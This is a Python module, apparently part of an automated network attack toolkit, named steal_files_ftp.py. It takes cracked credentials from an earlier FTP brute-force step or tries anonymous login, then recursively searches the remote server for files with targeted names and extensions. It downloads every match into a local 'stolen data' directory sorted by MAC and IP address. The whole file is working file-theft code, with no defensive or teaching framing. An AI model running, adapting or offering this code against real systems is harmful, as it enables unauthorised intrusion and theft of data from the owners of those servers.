"""
steal_files_ftp.py - This script connects to FTP servers using provided credentials or anonymous access, searches for specific files, and downloads them to a local directory.
"""

import os
import logging
import time
from rich.console import Console
from threading import Timer
from ftplib import FTP
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesFTP"
b_module = "steal_files_ftp"
b_status = "steal_files_ftp"
b_parent = "FTPBruteforce"
b_port = 21

class StealFilesFTP:
    """
    Class to handle the process of stealing files from FTP servers.
    """
    def __init__(self, shared_data):
        try:
            self.shared_data = shared_data
            self.ftp_connected = False
            self.stop_execution = False
            logger.info("StealFilesFTP initialized")
        except Exception as e:
            logger.error(f"Error during initialization: {e}")

    def connect_ftp(self, ip, username, password):
        """
        Establish an FTP connection.
        """
        try:
            ftp = FTP()
            ftp.connect(ip, 21)
            ftp.login(user=username, passwd=password)
            self.ftp_connected = True
            logger.info(f"Connected to {ip} via FTP with username {username}")
            return ftp
        except Exception as e:
            logger.error(f"FTP connection error for {ip} with user '{username}' and password '{password}': {e}")
            return None

    def find_files(self, ftp, dir_path):
        """
        Find files in the FTP share based on the configuration criteria.
        """
        files = []
        try:
            ftp.cwd(dir_path)
            items = ftp.nlst()
            for item in items:
                try:
                    ftp.cwd(item)
                    files.extend(self.find_files(ftp, os.path.join(dir_path, item)))
                    ftp.cwd('..')
                except Exception:
                    if any(item.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                       any(file_name in item for file_name in self.shared_data.steal_file_names):
                        files.append(os.path.join(dir_path, item))
            logger.info(f"Found {len(files)} matching files in {dir_path} on FTP")
        except Exception as e:
            logger.error(f"Error accessing path {dir_path} on FTP: {e}")
        return files

    def steal_file(self, ftp, remote_file, local_dir):
        """
        Download a file from the FTP server to the local directory.
        """
        try:
            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            local_file_dir = os.path.dirname(local_file_path)
            os.makedirs(local_file_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                ftp.retrbinary(f'RETR {remote_file}', f.write)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from FTP: {e}")

    def execute(self, ip, port, row, status_key):
        """
        Steal files from the FTP server.
        """
        try:
            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
                self.shared_data.bjornorch_status = "StealFilesFTP"
                logger.info(f"Stealing files from {ip}:{port}...")
                # Wait a bit because it's too fast to see the status change
                time.sleep(5)

                # Get FTP credentials from the cracked passwords file
                ftpfile = self.shared_data.ftpfile
                credentials = []
                if os.path.exists(ftpfile):
                    with open(ftpfile, 'r') as f:
                        lines = f.readlines()[1:]  # Skip the header
                        for line in lines:
                            parts = line.strip().split(',')
                            if parts[1] == ip:
                                credentials.append((parts[3], parts[4]))  # Username and password
                    logger.info(f"Found {len(credentials)} credentials for {ip}")

                def try_anonymous_access():
                    """
                    Try to access the FTP server without credentials.
                    """
                    try:
                        ftp = self.connect_ftp(ip, 'anonymous', '')
                        return ftp
                    except Exception as e:
                        logger.info(f"Anonymous access to {ip} failed: {e}")
                        return None

                if not credentials and not try_anonymous_access():
                    logger.error(f"No valid credentials found for {ip}. Skipping...")
                    return 'failed'

                def timeout():
                    """
                    Timeout function to stop the execution if no FTP connection is established.
                    """
                    if not self.ftp_connected:
                        logger.error(f"No FTP connection established within 4 minutes for {ip}. Marking as failed.")
                        self.stop_execution = True

                timer = Timer(240, timeout)  # 4 minutes timeout
                timer.start()

                # Attempt anonymous access first
                success = False
                ftp = try_anonymous_access()
                if ftp:
                    remote_files = self.find_files(ftp, '/')
                    mac = row['MAC Address']
                    local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/anonymous")
                    if remote_files:
                        for remote_file in remote_files:
                            if self.stop_execution:
                                break
                            self.steal_file(ftp, remote_file, local_dir)
                        success = True
                        countfiles = len(remote_files)
                        logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
                    ftp.quit()
                    if success:
                        timer.cancel()  # Cancel the timer if the operation is successful

                # Attempt to steal files using each credential if anonymous access fails
                for username, password in credentials:
                    if self.stop_execution:
                        break
                    try:
                        logger.info(f"Trying credential {username}:{password} for {ip}")
                        ftp = self.connect_ftp(ip, username, password)
                        if ftp:
                            remote_files = self.find_files(ftp, '/')
                            mac = row['MAC Address']
                            local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/{username}")
                            if remote_files:
                                for remote_file in remote_files:
                                    if self.stop_execution:
                                        break
                                    self.steal_file(ftp, remote_file, local_dir)
                                success = True
                                countfiles = len(remote_files)
                                logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} with user '{username}'")
                            ftp.quit()
                            if success:
                                timer.cancel()  # Cancel the timer if the operation is successful
                                break  # Exit the loop as we have found valid credentials
                    except Exception as e:
                        logger.error(f"Error stealing files from {ip} with user '{username}': {e}")

                # Ensure the action is marked as failed if no files were found
                if not success:
                    logger.error(f"Failed to steal any files from {ip}:{port}")
                    return 'failed'
                else:
                    return 'success'
        except Exception as e:
            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
            return 'failed'

if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ftp = StealFilesFTP(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
